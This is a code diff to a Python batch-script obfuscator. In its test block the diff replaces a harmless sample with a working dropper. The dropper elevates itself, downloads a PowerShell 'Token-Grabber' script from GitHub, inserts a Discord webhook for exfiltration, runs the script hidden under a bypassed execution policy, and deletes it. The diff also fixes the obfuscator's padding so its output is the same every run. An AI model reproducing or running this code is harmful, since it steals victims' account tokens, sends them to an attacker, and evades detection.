@@ -4,7 +4,8 @@ import string
 
 class NullParse:
     def __init__(self) -> None:
-        self.buffer = random.randint(10, 100)
+        # self.buffer = random.randint(10, 100)
+        self.buffer = 50
 
     def apply_obf(self, code: list) -> list:
         out_block = []
@@ -35,15 +36,23 @@ class NullParse:
 
     def make_random_string(self, length: int) -> str:
         """Generate random characters."""
-        return "".join(random.choice(string.ascii_letters) for i in range(length))
+        # return "".join(random.choice(string.ascii_letters) for i in range(length))
+        return "REM                                               "
 
 
 if __name__ == "__main__":
     test_code = r"""@echo off
-echo this is a test lul
-%test%echo this is a test lul
-REM fuhciuhiuhiuhk
-echo this is a test1"""
+net session >nul 2>&1
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
+cd /d %~dp0
+powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1227449757845159997/yF8mX-lM3516Ow9eIMBTTZo0D1qRa92HUpRKuGgGo0Adh7mlIdOPXHzw1JLB0vQ88HqW' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
+attrib +h +s powershell123.ps1
+powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
+powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
+attrib -h -s powershell123.ps1
+del powershell123.ps1 /f /q
+timeout 3 > nul
+exit"""
     test_code = test_code.splitlines()
     null_parse = NullParse()
     out_code = null_parse.apply_obf(test_code)
